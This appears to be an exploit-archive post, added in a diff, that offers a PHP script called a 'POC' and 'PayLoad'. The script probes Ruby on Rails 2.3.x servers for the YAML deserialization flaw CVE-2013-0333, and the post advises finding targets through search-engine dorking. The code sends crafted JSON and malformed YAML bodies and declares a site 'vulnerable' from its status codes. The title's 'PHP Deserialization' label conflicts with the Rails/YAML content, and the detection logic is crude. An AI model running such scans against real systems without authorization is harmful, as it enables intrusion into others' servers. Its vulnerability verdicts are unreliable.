@@ -1,0 +1,87 @@
+=============================================================================================================================================
+| # Title     : Ruby on Rails 2.3.x PHP Deserialization Scanner                                                                             |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 135.0.1 (64 bits)                                                            |
+| # Vendor    : https://rubyonrails.org/                                                                                                    |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: The code scans Ruby on Rails applications for YAML Deserialization vulnerability by sending different requests and parsing the response.
+	
+	 ( Related : https://packetstorm.news/files/id/181172/  Related CVE Numbers: CVE-2013-0333 )
+	
+[+] save code as poc.php.
+
+[+] Set Target : line 56
+
+[+] USage : php poc.php 
+
+[+] PayLoad :
+
+<?php
+
+class RailsJSONScanner
+{
+    private $targetUri;
+    private $httpMethod;
+
+    public function __construct($targetUri = '/', $httpMethod = 'POST')
+    {
+        $this->targetUri = $targetUri;
+        $this->httpMethod = strtoupper($httpMethod);
+    }
+
+    private function sendProbe($data)
+    {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $this->targetUri);
+        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $this->httpMethod);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        
+        $response = curl_exec($ch);
+        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        return [$httpCode, $response];
+    }
+
+    public function runScan()
+    {
+        echo "Scanning {$this->targetUri} with method {$this->httpMethod}\n";
+
+        list($code1, $res1) = $this->sendProbe(json_encode([
+            bin2hex(random_bytes(4)) => bin2hex(random_bytes(4))
+        ]));
+
+        if ($code1 >= 500) {
+            echo "[ERROR] Server responded with $code1. Check TARGETURI and HTTP_METHOD.\n";
+            return;
+        }
+
+        list($code2, $res2) = $this->sendProbe("--- {}\n");
+        list($code3, $res3) = $this->sendProbe("--- !ruby/object:\x00");
+
+        echo "Probe response codes: $code1 / $code2 / $code3\n";
+
+        if ($code2 == $code1 && $code3 != $code2 && $code3 != 200) {
+            echo "[VULNERABLE] Target is likely vulnerable! Server replied with $code3 for invalid YAML.\n";
+        } else {
+            echo "[SAFE] Target does not seem vulnerable.\n";
+        }
+    }
+}
+
+$scanner = new RailsJSONScanner('http://example.com', 'POST');
+$scanner->runScan();
+
+
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
